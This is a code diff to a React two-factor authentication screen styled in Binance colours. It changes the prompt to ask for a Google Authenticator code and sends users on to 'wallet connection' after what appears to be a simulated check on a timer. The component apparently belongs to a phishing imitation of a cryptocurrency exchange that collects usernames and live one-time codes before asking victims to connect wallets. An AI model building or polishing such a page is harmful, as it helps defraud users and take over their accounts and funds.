@@ -51,7 +51,7 @@ const TwoFactorAuth: React.FC<TwoFactorAuthProps> = ({ username, onTwoFactorSucc
       onTwoFactorSuccess();
       toast({
         title: "Verification successful",
-        description: "Proceeding to personal verification.",
+        description: "Proceeding to wallet connection.",
       });
     }, 1500);
   };
@@ -60,8 +60,8 @@ const TwoFactorAuth: React.FC<TwoFactorAuthProps> = ({ username, onTwoFactorSucc
     setTimer(30);
     setCanResend(false);
     toast({
-      title: "Code sent",
-      description: "A new verification code has been sent.",
+      title: "Code refreshed",
+      description: "Please check your Google Authenticator app.",
     });
   };
 
@@ -73,7 +73,7 @@ const TwoFactorAuth: React.FC<TwoFactorAuthProps> = ({ username, onTwoFactorSucc
             <Shield className="w-12 h-12 text-binance-yellow mx-auto mb-4" />
             <h1 className="text-2xl font-bold text-white mb-2">Two-Factor Authentication</h1>
             <p className="text-[#848E9C] text-base">
-              We've sent a verification code to your registered device
+              Enter the 6-digit code from your Google Authenticator app
             </p>
             <p className="text-[#848E9C] text-sm mt-2">
               Logged in as: <span className="text-white">{username}</span>
@@ -83,7 +83,7 @@ const TwoFactorAuth: React.FC<TwoFactorAuthProps> = ({ username, onTwoFactorSucc
           <form onSubmit={handleSubmit} className="space-y-6">
             <div>
               <Label htmlFor="code" className="text-[#B7BDC6] text-base mb-2 block">
-                6-Digit Verification Code
+                6-Digit Google Authenticator Code
               </Label>
               <Input
                 id="code"
@@ -113,17 +113,17 @@ const TwoFactorAuth: React.FC<TwoFactorAuthProps> = ({ username, onTwoFactorSucc
                 className="text-binance-yellow hover:underline text-sm flex items-center justify-center gap-2"
               >
                 <RefreshCw className="w-4 h-4" />
-                Resend Code
+                Refresh Code
               </button>
             ) : (
               <p className="text-[#848E9C] text-sm">
-                Resend code in {timer} seconds
+                Refresh available in {timer} seconds
               </p>
             )}
             
             <button
               onClick={onBack}
-              className="text-[#848E9C] hover:text-white text-sm"
+              className="text-binance-yellow hover:text-binance-yellow/80 text-sm font-medium"
             >
               Back to Login
             </button>
